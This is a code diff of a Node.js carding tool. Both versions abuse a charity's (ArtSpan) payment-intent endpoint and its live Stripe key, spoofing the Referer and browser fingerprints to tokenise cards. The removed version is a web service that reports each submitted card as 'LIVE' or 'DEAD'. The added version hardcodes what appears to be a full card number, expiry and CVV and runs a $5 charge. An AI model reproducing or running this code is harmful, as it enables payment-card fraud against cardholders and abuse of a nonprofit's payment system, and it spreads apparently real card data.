@@ -1,72 +1,67 @@
-const express = require('express');
 const axios = require('axios');
-const app = express();
-const PORT = process.env.PORT || 10000;
 
-app.use(express.json());
-
-// --- ARTPAN CONFIG ---
-const ARTPAN_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
-const ARTPAN_INTENT_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';
-
-// IDs that mimic real browser fingerprints
-const genID = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
+// Function to generate dynamic browser fingerprints
+const genFingerprint = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
     const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
     return v.toString(16);
 });
 
-app.get('/chk', async (req, res) => {
-    const cardParam = req.query.card;
-    if (!cardParam) return res.send('❌ Usage: /chk?card=num|mm|yyyy|cvv');
+const CONFIG = {
+    PK: 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm',
+    CARD: { num: '4283322085859286', mon: '06', year: '2026', cvv: '097' }
+};
 
-    const [num, mon, year, cvv] = cardParam.split('|').map(i => i.trim());
-    const fullYear = year.length === 2 ? `20${year}` : year;
+async function simulateHumanDonation() {
+    console.log("🧔 --- [MAN DONATING: STARTING FLOW] ---");
 
     try {
-        // 1. GET CLIENT SECRET
-        const intentRes = await axios.post(ARTPAN_INTENT_API, {
-            amount: 200,
-            email: `user${Math.floor(Math.random()*999)}@gmail.com`,
+        // STEP 1: Get Secret (Initiating the donation form)
+        const intentRes = await axios.post('https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent', {
+            amount: 500, // $5.00 donation
+            email: `donor${Math.floor(Math.random()*1000)}@gmail.com`,
             live: true
         });
         const secret = intentRes.data.clientSecret;
-        const pi_id = secret.split('_secret')[0];
+        console.log("✅ Donation Initiated");
 
-        // 2. CREATE PAYMENT METHOD (The Bypass Step)
-        // We use the 'payment_methods' endpoint which is less restricted
+        // STEP 2: Tokenization (The Bypass)
+        // We set headers to look like we are using a real browser on the ArtSpan site
         const pmRes = await axios.post('https://api.stripe.com/v1/payment_methods', 
             new URLSearchParams({
                 'type': 'card',
-                'card[number]': num,
-                'card[cvc]': cvv,
-                'card[exp_month]': parseInt(mon),
-                'card[exp_year]': parseInt(fullYear),
-                'key': ARTPAN_PK,
-                'guid': genID(),
-                'muid': genID(),
-                'sid': genID(),
+                'card[number]': CONFIG.CARD.num,
+                'card[cvc]': CONFIG.CARD.cvv,
+                'card[exp_month]': CONFIG.CARD.mon,
+                'card[exp_year]': CONFIG.CARD.year,
+                'key': CONFIG.PK,
+                'guid': genFingerprint(),
+                'muid': genFingerprint(),
+                'sid': genFingerprint(),
+                'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796'
             }).toString(),
             {
                 headers: {
                     'Origin': 'https://js.stripe.com',
-                    'Referer': 'https://www.artspan.org/', // SPOOFED AUTHORIZED DOMAIN
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                    'Referer': 'https://www.artspan.org/', // Authorized domain
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0'
                 }
             }
         ).catch(e => e.response);
 
         if (pmRes.data.error) {
-            return res.send(`<h2>❌ Surface Blocked</h2><p>${pmRes.data.error.message}</p>`);
+            console.log("❌ Surface Error:", pmRes.data.error.message);
+            return;
         }
 
         const pm_id = pmRes.data.id;
+        console.log("✅ Card Handshake Success:", pm_id);
 
-        // 3. CONFIRM THE PAYMENT
-        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${pi_id}/confirm`, 
+        // STEP 3: Final Confirmation
+        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${secret.split('_secret')[0]}/confirm`, 
             new URLSearchParams({
-                'payment_method': pm_id, // We use the ID, not raw data
+                'payment_method': pm_id,
                 'client_secret': secret,
-                'key': ARTPAN_PK
+                'key': CONFIG.PK
             }).toString(),
             {
                 headers: {
@@ -74,23 +69,13 @@ app.get('/chk', async (req, res) => {
                     'Referer': 'https://www.artspan.org/'
                 }
             }
-        ).catch(e => e.response);
+        );
 
-        // --- DISPLAY RESULT ---
-        const data = confirmRes.data;
-        const isLive = data.status === 'succeeded' || (data.error && data.error.decline_code === 'insufficient_funds');
-        
-        res.send(`
-            <div style="font-family:sans-serif; text-align:center; margin-top:50px;">
-                <h1 style="color:${isLive ? 'green' : 'red'};">${isLive ? '✅ LIVE' : '❌ DEAD'}</h1>
-                <p><b>Bank Response:</b> ${data.error ? data.error.message : 'Success'}</p>
-                <p><b>Decline Code:</b> ${data.error ? (data.error.decline_code || 'generic_decline') : 'success'}</p>
-            </div>
-        `);
+        console.log("💰 DONATION RESULT:", confirmRes.data.status);
 
     } catch (err) {
-        res.status(500).send(`Error: ${err.message}`);
+        console.log("❌ Bank Response:", err.response ? err.response.data.error.message : err.message);
     }
-});
+}
 
-app.listen(PORT, () => console.log(`Bypass active on ${PORT}`));
+simulateHumanDonation();
